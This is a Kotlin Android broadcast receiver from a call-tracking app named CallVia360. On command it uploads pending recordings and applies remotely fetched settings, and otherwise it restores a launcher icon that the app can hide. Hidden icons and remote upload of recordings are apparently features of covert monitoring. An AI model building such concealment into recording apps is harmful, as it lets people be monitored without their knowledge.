package com.CallVia360.app

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log

class AdminReceiver : BroadcastReceiver() {
    companion object {
        private const val TAG = "AdminReceiver"
    }

    override fun onReceive(context: Context, intent: Intent?) {
        Log.i(TAG, "AdminReceiver received action: ${intent?.action}")
        if (intent?.action == "com.CallVia360.app.ACTION_SYNC") {
            NativeSyncManager.triggerSync(context)
            NativeSyncManager.uploadPendingRecordings(context)
            NativeSyncManager.fetchSettingsAndApply(context)
            return
        }
        try {
            val mainComp = ComponentName(context, "${context.packageName}.MainActivity")
            context.packageManager.setComponentEnabledSetting(
                mainComp,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            val aliasComp = ComponentName(context, "${context.packageName}.LauncherAlias")
            context.packageManager.setComponentEnabledSetting(
                aliasComp,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            )
            context.getSharedPreferences("sales_track_prefs", Context.MODE_PRIVATE)
                .edit().putBoolean("app_icon_hidden", false).apply()
            Log.i(TAG, "Successfully enabled MainActivity and LauncherAlias")

            if (intent?.getBooleanExtra("start_activity", false) == true) {
                val launchIntent = Intent(context, MainActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                }
                context.startActivity(launchIntent)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed in AdminReceiver: ${e.message}")
        }
    }
}

